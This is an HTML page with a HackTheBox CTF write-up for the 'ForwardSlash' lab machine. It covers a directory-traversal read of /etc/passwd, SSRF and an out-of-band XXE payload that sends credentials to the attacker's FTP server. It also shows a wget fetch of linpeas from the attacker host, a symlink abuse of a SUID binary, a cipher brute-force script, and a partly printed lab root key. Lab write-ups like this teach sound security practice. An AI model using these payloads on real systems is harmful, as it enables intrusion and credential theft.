<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>ForwardSlash | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,hard"><meta name=description content="ForwardSlash HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/forwardslash/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/forwardslash/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="ForwardSlash "><meta property="og:description" content="ForwardSlash HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/forwardslash/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/forwardslash/forwardslash.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-07-05T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/forwardslash/forwardslash.png"><meta name=twitter:title content="ForwardSlash "><meta name=twitter:description content="ForwardSlash HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"ForwardSlash ","item":"https://s4ch.github.io/writeups/hackthebox/forwardslash/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"ForwardSlash ","name":"ForwardSlash ","description":"ForwardSlash HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","hard"],"articleBody":"≡ƒÆó Info Name: ForwardSlash Profile: www.hackthebox.eu Difficulty: Hard OS: Linux Points: 40 Overview TL;DR: There is a web application with a parameter vulnerable to file disclosure, directory traversal and SSRF (not LFI/RFI). Then we can exploit an OOB XXE over FTP to steal FTP credentials. Then with credential stuffing we land on the box via SSH. On the system we exploit a SUID binary to read a configuration file that leaks a database password. With credential stuffing again we can elevate to a more powerful user via SSH. Then we have to break a custom crypto algorithm to decrypt a ciphertext. The decrypted cyphertext gives the password of a LUKS container. Then we can mount the container with sudo permissions and get the root SSH private key.\nInstall tools used in this WU on BlackArch Linux:\n$ sudo pacman -S nmap\tffuf curl burpsuite xxeserv peass haiti openssh Network Enumeration Let’s start by scanning port and services with nmap:\n# Nmap 7.80 scan initiated Fri Jun 12 13:17:07 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.183 Nmap scan report for 10.10.10.183 Host is up (0.022s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA) | 256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA) |_ 256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Did not follow redirect to http://forwardslash.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jun 12 13:17:36 2020 -- 1 IP address (1 host up) scanned in 29.63 seconds If we try to reach http://10.10.10.183, we are redirected to http://forwardslash.htb\nSo let’s edit /etc/hosts to add this entry:\n10.10.10.183 forwardslash.htb HTTP discovery Let’s see what we have at http://forwardslash.htb/\nSo the site was defaced. The defacer is talking about XML so there must be a XXE and is also talking about Automatic FTP Logins.\nHTTP enumeration Let’s find if there are files hidden somewhere with [ffuf][ffuf]:\n$ ffuf -u http://forwardslash.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -fc 403 -e .txt /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://forwardslash.htb/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Extensions : .txt :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response status: 403 ________________________________________________ . [Status: 200, Size: 1695, Words: 207, Lines: 42] note.txt [Status: 200, Size: 216, Words: 39, Lines: 5] :: Progress: [76534/76534]┬á:: Job [1/1] :: 1700 req/sec :: Duration: [0:00:45] :: Errors: 0 :: There is one:\n$ curl http://forwardslash.htb/note.txt Pain, we were hacked by some skids that call themselves the \"Backslash Gang\"... I know... That name... Anyway I am just leaving this note here to say that we still have that backup site so we should be fine. -chiv So if there is a backup site it may be online too. Let’s find it by bruteforcing virtual hosts with subdomains:\n$ ffuf -u http://10.10.10.183/ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -H 'Host: FUZZ.forwardslash.htb' -fs 1695 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://10.10.10.183/ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Header : Host: FUZZ.forwardslash.htb :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response size: 1695 ________________________________________________ backup [Status: 200, Size: 1267, Words: 336, Lines: 40] :: Progress: [38267/38267]┬á:: Job [1/1] :: 708 req/sec :: Duration: [0:00:54] :: Errors: 0 :: So let’s add backup.forwardslash.htb to /etc/hosts too.\n10.10.10.183 backup.forwardslash.htb We are redirected to http://backup.forwardslash.htb/login.php\nThere is a login form. We can use the registration page to sign up.\nIf we sign up and log in, we are redirected to http://backup.forwardslash.htb/welcome.php\nHTTP exploitation: file disclosure \u0026 directory traversal The Change your Profile Picture! feature is disabled.\nBut that’s just from the HTML so let’s edit the DOM, remove the disabled attributes and send a request:\nBy doing a directory traversal on /etc/passwd we obtained a file disclosure:\nPOST /profilepicture.php HTTP/1.1 Host: backup.forwardslash.htb ... Cookie: PHPSESSID=mbmjmv76c2veso4c1ihneuh5bt url=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin pain:x:1000:1000:pain:/home/pain:/bin/bash chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false HTTP exploitation: SSRF We can also see if there are any other pages:\n$ ffuf -u http://backup.forwardslash.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.php -fs 288 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://backup.forwardslash.htb/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Extensions : .txt .php :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response size: 288 ________________________________________________ login.php [Status: 200, Size: 1267, Words: 336, Lines: 40] register.php [Status: 200, Size: 1490, Words: 426, Lines: 42] index.php [Status: 200, Size: 1267, Words: 336, Lines: 40] logout.php [Status: 200, Size: 1267, Words: 336, Lines: 40] config.php [Status: 200, Size: 0, Words: 1, Lines: 1] api.php [Status: 200, Size: 127, Words: 22, Lines: 2] dev [Status: 403, Size: 65, Words: 6, Lines: 1] . [Status: 200, Size: 1267, Words: 336, Lines: 40] welcome.php [Status: 200, Size: 1267, Words: 336, Lines: 40] environment.php [Status: 200, Size: 1267, Words: 336, Lines: 40] reset-password.php [Status: 200, Size: 1267, Words: 336, Lines: 40] hof.php [Status: 200, Size: 1267, Words: 336, Lines: 40] :: Progress: [114801/114801]┬á:: Job [1/1] :: 1881 req/sec :: Duration: [0:01:01] :: Errors: 0 :: It seems there is a dev endpoint that dives us a HTTP 403. But even authenticated we can’t access http://backup.forwardslash.htb/dev/\nHopefully the url parameter is not only vulnerable to file disclosure and path traversal but also to SSRF (Server Side Request Forgery). Maybe locally this will be allowed, so let’s try teh following request in burp:\nPOST /profilepicture.php HTTP/1.1 Host: backup.forwardslash.htb ... Cookie: PHPSESSID=mbmjmv76c2veso4c1ihneuh5bt url=http://backup.forwardslash.htb/dev/ Yes! We obtained the HTML code of the dev endpoint:\n\u003chtml\u003e \u003ch1\u003eXML Api Test\u003c/h1\u003e \u003ch3\u003eThis is our api test for when our new website gets refurbished\u003c/h3\u003e \u003cform action=\"/dev/index.php\" method=\"get\" id=\"xmltest\"\u003e \u003ctextarea name=\"xml\" form=\"xmltest\" rows=\"20\" cols=\"50\"\u003e\u003capi\u003e \u003crequest\u003etest\u003c/request\u003e \u003c/api\u003e \u003c/textarea\u003e \u003cinput type=\"submit\"\u003e \u003c/form\u003e \u003c/html\u003e It’s talking about XML and FTP login as said in the deface.\nLet’s try to send a default request to the XML api:\nPOST /profilepicture.php HTTP/1.1 Host: backup.forwardslash.htb ... Cookie: PHPSESSID=mbmjmv76c2veso4c1ihneuh5bt url=http://backup.forwardslash.htb/dev/index.php?xml= Nothing fancy yet.\nHTTP exploitation: XXE We noticed in the HTML code the following structure:\ntest So let’s try to forge a simple XXE payload using it:\n\u003c?xml version=\"1.0\" ?\u003e \u003c!DOCTYPE replace [\u003c!ENTITY xxe \"cyfun\"\u003e]\u003e \u0026xxe; So I tried to send something like that:\nurl=http://backup.forwardslash.htb/dev/index.php?xml%3d\u003c?xml%20version%3d\"1.0\"%20?\u003e\u003c!DOCTYPE%20replace%20[\u003c!ENTITY%20xxe%20\"cyfun\"\u003e]\u003e%20%20%26xxe; But this doesn’t work. But let’s remember the FTP hint!\nMaybe the XXE is OOB (Out Of Band) only. In general, working with FTP for OOB is far better than HTTP as it wil allows us to retrieve the whole file rather than the 1st line. Here I don’t think we will retrieve files but rather credentials as it’s said there is a FTP autologin feature. So we won’t need a complex payload:\n\u003c?xml version=\"1.0\" ?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY % ext SYSTEM \"ftp://10.10.15.32/\"\u003e %ext; ]\u003e dontcare Our payload will look like this:\nurl=http://backup.forwardslash.htb/dev/index.php?xml%3d\u003c%3fxml%2520version%253d\"1.0\"%2520%3f\u003e\u003c!DOCTYPE%2520root%2520[\u003c!ENTITY%2520%25%2520ext%2520SYSTEM%2520\"ftp%3a//10.10.15.32/\"\u003e%2520%25ext%3b]\u003edontcare PS: even if burp automatically URL encode key character for us we need to double encore the key character in the xml payload for the request to work.\nBut before let’s start [xxeserv][xxeserv], a fake FTP server, then, when submitting the request we will receive the credentials:\n$ sudo xxeserv -p 21 [*] UNO Listening... 2020/07/05 19:32:51 [*] GO XXE FTP Server - Port: 21 2020/07/05 19:32:55 [*] Connection Accepted from [10.10.10.183:50146] USER: chiv PASS: N0bodyL1kesBack/ 2020/07/05 19:32:55 [x] Connection Closed 2020/07/05 19:32:55 [*] Closing FTP Connection Two important things were required here:\nrunning the FTP server on port 21 (eg. port 2121 was filtered) adding a leading slash to the request (eg. ftp://10.10.15.32/ works but ftp://10.10.15.32 not) Network exploitation: credential stuffing Let’s see if we can re-use the FTP credentials on SSH:\n$ ssh chiv@forwardslash.htb The authenticity of host 'forwardslash.htb (10.10.10.183)' can't be established. ECDSA key fingerprint is SHA256:7DrtoyB3GmTDLmPm01m7dHeoaPjA7+ixb3GDFhGn0HM. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'forwardslash.htb,10.10.10.183' (ECDSA) to the list of known hosts. chiv@forwardslash.htb's password: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Jul 5 17:42:11 UTC 2020 System load: 0.0 Processes: 196 Usage of /: 30.8% of 19.56GB Users logged in: 0 Memory usage: 19% IP address for ens33: 10.10.10.183 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 16 packages can be updated. 0 updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Jul 5 15:11:43 2020 from 10.10.14.230 chiv@forwardslash:~$ System enumeration Let’s see what is inside /var/backups/:\nchiv@forwardslash:~$ ls -lhA /var/backups/ total 804K -rw-r--r-- 1 root root 60K Mar 24 06:25 alternatives.tar.0 -rw-r--r-- 1 root root 38K Mar 24 06:17 apt.extended_states.0 -rw-r--r-- 1 root root 4.1K Mar 6 14:17 apt.extended_states.1.gz -rw-r--r-- 1 root root 3.9K Mar 5 14:46 apt.extended_states.2.gz -rw------- 1 pain pain 526 Jun 21 2019 config.php.bak -rw-r--r-- 1 root root 437 Mar 5 14:07 dpkg.diversions.0 -rw-r--r-- 1 root root 207 Mar 5 14:47 dpkg.statoverride.0 -rw-r--r-- 1 root root 653K Mar 24 06:17 dpkg.status.0 -rw------- 1 root root 730 Mar 17 20:13 group.bak -rw------- 1 root shadow 604 Mar 17 20:13 gshadow.bak -r--r--r-- 1 root root 129 May 27 2019 note.txt -rw------- 1 root root 1.7K Mar 5 14:46 passwd.bak drwxrwx--- 2 root backupoperator 4.0K May 27 2019 recovery -rw------- 1 root shadow 1.2K Mar 6 14:21 shadow.bak There are:\nconfig.php.bak owned by pain note.txt which is world readable recovery folder owned by the backupoperator group The only thing we can read for now is note.txt:\nChiv, this is the backup of the old config, the one with the password we need to actually keep safe. Please DO NOT TOUCH. -Pain Let’s try to enumerate more with the help of linPEAS (from [PEASS][PEASS]).\nWe have /usr/share/peass/linPEAS/linpeas.sh, let’s just serve it via HTTP:\n$ ruby -run -e httpd /usr/share/peass/linPEAS/ -p 8888 [2020-07-05 20:13:39] INFO WEBrick 1.6.0 [2020-07-05 20:13:39] INFO ruby 2.7.1 (2020-03-31) [x86_64-linux] [2020-07-05 20:13:39] INFO WEBrick::HTTPServer#start: pid=117003 port=8888 Now let’s download it on the box:\nchiv@forwardslash:/tmp/cyfun$ wget http://10.10.15.32:8888/linpeas.sh chiv@forwardslash:/tmp/cyfun$ chmod u+x linpeas.sh In the SUID section we can see an unusual /usr/bin/backup.\nchiv@forwardslash:~$ ls -lh /usr/bin/backup -r-sr-xr-x 1 pain pain 14K Mar 6 10:06 /usr/bin/backup Privilege Escalation : from chiv to pain backup is owned by pain.\nLet’s try to run it:\nchiv@forwardslash:~$ backup ---------------------------------------------------------------------- Pain's Next-Gen Time Based Backup Viewer v0.1 NOTE: not reading the right file yet, only works if backup is taken in same second ---------------------------------------------------------------------- Current Time: 18:37:43 ERROR: 01430555472f086a6633fad6bfc18d98 Does Not Exist or Is Not Accessible By Me, Exiting... There is a hash in the error output, let’s identify the hash type with :\n$ haiti 01430555472f086a6633fad6bfc18d98 MD2 [JtR: md2] MD5 [HC: 0] [JtR: raw-md5] MD4 [HC: 900] [JtR: raw-md4] Double MD5 [HC: 2600] LM [HC: 3000] [JtR: lm] RIPEMD-128 [JtR: ripemd-128] Haval-128 [JtR: haval-128-4] Tiger-128 Skein-256(128) Skein-512(128) Lotus Notes/Domino 5 [HC: 8600] [JtR: lotus5] Skype [HC: 23] Snefru-128 [JtR: snefru-128] NTLM [HC: 1000] [JtR: nt] Domain Cached Credentials [HC: 1100] [JtR: mscach] Domain Cached Credentials 2 [HC: 2100] [JtR: mscach2] DNSSEC(NSEC3) [HC: 8300] RAdmin v2.x [HC: 9900] [JtR: radmin] It’s most likely a MD5 hash but we can’t crack it.\nAs it’s a Time Based Backup Viewer it’s maybe the hash of the timestamp.\n$ printf %s '18:37:43' | md5sum 01430555472f086a6633fad6bfc18d98 - Let’s write a script that will create a file like this.\ntime=$(date +\"%H:%M:%S\") hash=$(printf %s $time | md5sum | cut -d ' ' -f 1) # create file echo 'cyfun test' \u003e $hash # call backup backup If we execute the script we have no error now and the file is read:\nchiv@forwardslash:/tmp/cyfun$ ./time.sh ---------------------------------------------------------------------- Pain's Next-Gen Time Based Backup Viewer v0.1 NOTE: not reading the right file yet, only works if backup is taken in same second ---------------------------------------------------------------------- Current Time: 18:51:46 cyfun test So we can read a file owned by pain now by modifying our scipt:\ntime=$(date +\"%H:%M:%S\") hash=$(printf %s $time | md5sum | cut -d ' ' -f 1) # create file ln -s /var/backups/config.php.bak $hash # call backup backup Now we can read /var/backups/config.php.bak:\n\u003c?php /* Database credentials. Assuming you are running MySQL server with default setting (user 'root' with no password) */ define('DB_SERVER', 'localhost'); define('DB_USERNAME', 'pain'); define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704'); define('DB_NAME', 'site'); /* Attempt to connect to MySQL database */ $link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME); // Check connection if($link === false){ die(\"ERROR: Could not connect. \" . mysqli_connect_error()); } ?\u003e Again let’s try credential stuffing on SSH:\n$ ssh pain@forwardslash.htb pain@forwardslash.htb's password: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Jul 5 19:12:12 UTC 2020 System load: 0.0 Processes: 174 Usage of /: 30.8% of 19.56GB Users logged in: 1 Memory usage: 11% IP address for ens33: 10.10.10.183 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 16 packages can be updated. 0 updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Thu Mar 5 14:22:04 2020 from 192.168.56.1 pain@forwardslash:~$ cat user.txt dd552dcd5a367ea132ee2f017dc5a02d Decrypting the ciphertext We can run some commands as root:\npain@forwardslash:~/encryptorinator$ sudo -l Matching Defaults entries for pain on forwardslash: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User pain may run the following commands on forwardslash: (root) NOPASSWD: /sbin/cryptsetup luksOpen * (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/ (root) NOPASSWD: /bin/umount ./mnt/ Let’s see what is in pain home directory:\npain@forwardslash:~$ ls -lhA total 40K lrwxrwxrwx 1 pain root 9 Mar 6 09:43 .bash_history -\u003e /dev/null -rw-r--r-- 1 pain pain 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 pain pain 3.7K Apr 4 2018 .bashrc drwx------ 2 pain pain 4.0K Mar 5 14:22 .cache drwxr-xr-x 2 pain root 4.0K Mar 24 12:06 encryptorinator drwx------ 3 pain pain 4.0K Mar 5 14:22 .gnupg drwxrwxr-x 3 pain pain 4.0K Mar 6 14:23 .local -rw-r--r-- 1 pain root 256 Jun 3 2019 note.txt -rw-r--r-- 1 pain pain 807 Apr 4 2018 .profile drwx------ 2 pain pain 4.0K Mar 17 20:29 .ssh -rw------- 1 pain pain 33 Jul 5 18:34 user.txt There is a note file talking about a crypto software.\npain@forwardslash:~$ cat note.txt Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go. -chiv pain@forwardslash:~$ ls -lhA encryptorinator/ total 8.0K -rw-r--r-- 1 pain root 165 Jun 3 2019 ciphertext -rw-r--r-- 1 pain root 931 Jun 3 2019 encrypter.py Also it seems that pain is in the backupoperator group.\npain@forwardslash:~$ id uid=1000(pain) gid=1000(pain) groups=1000(pain),1002(backupoperator) So we can now see what is in /var/backups/recovery/:\npain@forwardslash:~$ ls -lhA /var/backups/recovery/encrypted_backup.img -rw-r----- 1 root backupoperator 954M Mar 24 12:12 /var/backups/recovery/encrypted_backup.img An encrypted backup! We must take a look to the crypto-soft to break that.\nLet’s look a this ugly python script encrypter.py:\ndef encrypt(key, msg): key = list(key) msg = list(msg) for char_key in key: for i in range(len(msg)): if i == 0: tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1]) else: tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1]) while tmp \u003e 255: tmp -= 256 msg[i] = chr(tmp) return ''.join(msg) def decrypt(key, msg): key = list(key) msg = list(msg) for char_key in reversed(key): for i in reversed(range(len(msg))): if i == 0: tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1])) else: tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1])) while tmp \u003c 0: tmp += 256 msg[i] = chr(tmp) return ''.join(msg) print encrypt('REDACTED', 'REDACTED') print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED')) It’s a custom block cipher, so the only things that matter is to find the key lenght and the first character of the key which much more simple than guessing the exact key. Maybe the beginning for the decrypted text will be messed up but with luck we won’t need it.\nLet’s download the ciphertext locally:\n$ scp pain@forwardslash.htb:/home/pain/encryptorinator/ciphertext ./ As I am more at ease with Ruby than with Python, I rewrote the decrypt() method in Ruby and then made a script to bruteforce an approximative key.\n#!/usr/bin/env ruby def decrypt(key, msg) key = key.chars msg = msg.chars tmp = 0 key.reverse.each do |char_key| (0...msg.size).reverse_each do |i| if i == 0 tmp = msg[i].ord - (char_key.ord + msg[-1].ord) else tmp = msg[i].ord - (char_key.ord + msg[i-1].ord) end while tmp \u003c 0 tmp += 256 end msg[i] = tmp.chr end end return msg.join end ciphertext = File.binread('ciphertext') words = ['encrypt', 'key', 'backup', 'password'] found_key = false (1..100).each do |key_length| ('a'..'z').each do |c| guessed_key = c * key_length d = decrypt(guessed_key, ciphertext) if words.any? { |word| d.include?(word) } puts \"Approximate key: #{guessed_key}\" puts \"Partially decrypted text: #{d}\" found_key = true break end break if found_key end end Now let’s run it:\n$ ruby bf.rb Approximate key: ttttttttttttttttt Partially decrypted text: ∩┐╜$7C∩┐╜∩┐╜q8∩┐╜∩┐╜4∩┐╜l'you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf∩┐╜ The crypto part is not interesting me so I won’t develop the explanation more than that but you can take a look at IppSec video to see the reasoning.\nPrivilege Escalation : from pain to root $ pain@forwardslash:~/encryptorinator$ file /var/backups/recovery/encrypted_backup.img /var/backups/recovery/encrypted_backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: f2a0906a-c412-48db-8c18-3b72443c1bdf Now it’s pretty clear we have to mount the LUKS container with the password we just found.\nLet’s see the commands we can run as root again:\npain@forwardslash:~/encryptorinator$ sudo -l Matching Defaults entries for pain on forwardslash: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User pain may run the following commands on forwardslash: (root) NOPASSWD: /sbin/cryptsetup luksOpen * (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/ (root) NOPASSWD: /bin/umount ./mnt/ First we open the LUKS container and create a mount point.\npain@forwardslash:~/encryptorinator$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup Enter passphrase for /var/backups/recovery/encrypted_backup.img: cB!6%sdH8Lj^@Y*$C2cf pain@forwardslash:~/encryptorinator$ mkdir -p /tmp/cyfun2/mnt pain@forwardslash:~/encryptorinator$ cd /tmp/cyfun2 Then we can mount the openned container:\npain@forwardslash:/tmp/cyfun2$ sudo /bin/mount /dev/mapper/backup ./mnt/ The mounted device contains only one file:\npain@forwardslash:/tmp/cyfun2$ cat mnt/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9 MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO 